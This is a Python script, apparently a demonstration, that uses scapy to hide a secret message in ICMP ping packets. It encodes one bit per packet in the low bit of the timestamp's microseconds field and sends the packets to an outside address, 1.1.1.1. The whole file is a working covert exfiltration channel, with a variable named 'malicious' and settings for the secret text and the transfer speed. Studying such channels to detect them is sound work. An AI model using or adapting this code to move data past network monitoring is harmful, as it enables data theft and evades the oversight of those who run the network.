from scapy.all import IP, ICMP, sr1
import time
import struct

def build_ping_packet(dst_ip, identifier, sequence_number, bit):
    # Current time for timestamp
    now = time.time()
    seconds = int(now)
    microseconds = int((now - seconds) * 1_000_000)
    microseconds_bin = bin(microseconds)[2:-1] + bit
    malicious_mircoseconds = int(microseconds_bin, 2)

    # Create timestamp (16 bytes) - seconds and microseconds
    timestamp = struct.pack('!QQ', seconds, malicious_mircoseconds)

    # Create pattern to fill the payload (after timestamp)
    pattern = bytes(range(0x10, 0x10 + 40))  # 40 bytes: 0x10 to 0x37

    # Final payload: timestamp + pattern (total 56 bytes)
    payload = timestamp + pattern

    # Build full packet
    packet = IP(dst=dst_ip)/ICMP(id=identifier, seq=sequence_number)/payload

    return packet

if __name__ == "__main__":
    # Target IP address
    target = "1.1.1.1"

    # Example ID and Sequence
    icmp_id = 3417
    icmp_seq = 0

    secretText = "Hi!" # Change secret text here
    secretText_bin = ''.join(format(ord(char), '08b') for char in secretText)

    for bit in secretText_bin: 
        # Build packet
        icmp_seq += 1   
        pkt = build_ping_packet(target, icmp_id, icmp_seq, bit)
        # Send packet
        response = sr1(pkt, timeout = 2, verbose = 0)
        if response:
            print(f"Received response for icmp_seq {icmp_seq} from {response.src}")
        else:
            print("No response received (timeout)")
        time.sleep(1) #change to adjust transfer speed
